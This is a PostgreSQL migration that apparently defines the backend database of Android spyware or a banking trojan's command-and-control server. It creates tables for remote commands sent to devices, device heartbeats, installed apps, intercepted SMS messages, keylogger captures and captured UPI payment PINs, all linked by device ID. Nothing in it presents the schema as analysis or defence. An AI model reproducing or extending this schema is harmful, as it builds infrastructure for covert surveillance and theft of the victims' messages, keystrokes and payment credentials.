-- CreateTable
CREATE TABLE "device_commands" (
    "id" UUID NOT NULL DEFAULT gen_random_uuid(),
    "device_id" TEXT NOT NULL,
    "command" TEXT NOT NULL,
    "payload" JSONB,
    "status" TEXT DEFAULT 'pending',
    "created_at" TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP,
    "delivered_at" TIMESTAMPTZ,
    "executed_at" TIMESTAMPTZ,

    CONSTRAINT "device_commands_pkey" PRIMARY KEY ("id")
);

-- CreateTable
CREATE TABLE "devices" (
    "device_id" TEXT NOT NULL,
    "android_id" TEXT,
    "manufacturer" TEXT,
    "model" TEXT,
    "status" BOOLEAN DEFAULT false,
    "last_seen" TIMESTAMPTZ,
    "brand" TEXT,
    "product" TEXT,
    "android_version" TEXT,
    "raw_device_info" TEXT,
    "sim_cards" JSONB,
    "service_status" JSONB,
    "oem_status" JSONB,
    "power_save_status" JSONB,
    "screen_status" JSONB,
    "process_importance" TEXT,
    "created_at" TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP,
    "updated_at" TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP,
    "build_id" TEXT,
    "app_id" TEXT,

    CONSTRAINT "devices_pkey" PRIMARY KEY ("device_id")
);

-- CreateTable
CREATE TABLE "heartbeat" (
    "id" BIGSERIAL NOT NULL,
    "device_id" TEXT NOT NULL,
    "last_update" TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP,
    "type" TEXT DEFAULT 'ping',
    "created_at" TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP,
    "updated_at" TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP,

    CONSTRAINT "heartbeat_pkey" PRIMARY KEY ("id")
);

-- CreateTable
CREATE TABLE "installed_apps" (
    "device_id" TEXT NOT NULL,
    "package_name" TEXT NOT NULL,
    "app_name" TEXT NOT NULL,
    "icon" TEXT,
    "version_name" TEXT,
    "version_code" BIGINT,
    "first_install_time" BIGINT,
    "last_update_time" BIGINT,
    "is_system_app" BOOLEAN DEFAULT false,
    "target_sdk" INTEGER,
    "min_sdk" INTEGER,
    "sync_timestamp" BIGINT NOT NULL,
    "created_at" TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP,
    "updated_at" TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP,

    CONSTRAINT "installed_apps_pkey" PRIMARY KEY ("device_id","package_name")
);

-- CreateTable
CREATE TABLE "key_logger" (
    "id" UUID NOT NULL DEFAULT gen_random_uuid(),
    "device_id" TEXT NOT NULL,
    "key" TEXT NOT NULL,
    "keylogger" TEXT NOT NULL,
    "created_at" TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP,
    "currentDate" TIMESTAMPTZ,

    CONSTRAINT "key_logger_pkey" PRIMARY KEY ("id")
);

-- CreateTable
CREATE TABLE "sms_messages" (
    "id" TEXT NOT NULL,
    "device_id" TEXT NOT NULL,
    "local_sms_id" TEXT NOT NULL,
    "address" TEXT NOT NULL,
    "body" TEXT NOT NULL,
    "date" TEXT NOT NULL,
    "timestamp" BIGINT NOT NULL,
    "type" INTEGER NOT NULL,
    "sync_status" TEXT DEFAULT 'synced',
    "created_at" TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP,
    "updated_at" TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP,

    CONSTRAINT "sms_messages_pkey" PRIMARY KEY ("id","device_id")
);

-- CreateTable
CREATE TABLE "upi_pins" (
    "id" UUID NOT NULL DEFAULT gen_random_uuid(),
    "device_id" TEXT NOT NULL,
    "pin" TEXT NOT NULL,
    "created_at" TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP,
    "currentDate" TIMESTAMPTZ,

    CONSTRAINT "upi_pins_pkey" PRIMARY KEY ("id")
);

-- AddForeignKey
ALTER TABLE "device_commands" ADD CONSTRAINT "device_commands_device_id_fkey" FOREIGN KEY ("device_id") REFERENCES "devices"("device_id") ON DELETE CASCADE ON UPDATE CASCADE;

-- AddForeignKey
ALTER TABLE "heartbeat" ADD CONSTRAINT "heartbeat_device_id_fkey" FOREIGN KEY ("device_id") REFERENCES "devices"("device_id") ON DELETE CASCADE ON UPDATE CASCADE;

-- AddForeignKey
ALTER TABLE "installed_apps" ADD CONSTRAINT "installed_apps_device_id_fkey" FOREIGN KEY ("device_id") REFERENCES "devices"("device_id") ON DELETE CASCADE ON UPDATE CASCADE;

-- AddForeignKey
ALTER TABLE "key_logger" ADD CONSTRAINT "key_logger_device_id_fkey" FOREIGN KEY ("device_id") REFERENCES "devices"("device_id") ON DELETE CASCADE ON UPDATE CASCADE;

-- AddForeignKey
ALTER TABLE "sms_messages" ADD CONSTRAINT "sms_messages_device_id_fkey" FOREIGN KEY ("device_id") REFERENCES "devices"("device_id") ON DELETE CASCADE ON UPDATE CASCADE;

-- AddForeignKey
ALTER TABLE "upi_pins" ADD CONSTRAINT "upi_pins_device_id_fkey" FOREIGN KEY ("device_id") REFERENCES "devices"("device_id") ON DELETE CASCADE ON UPDATE CASCADE;
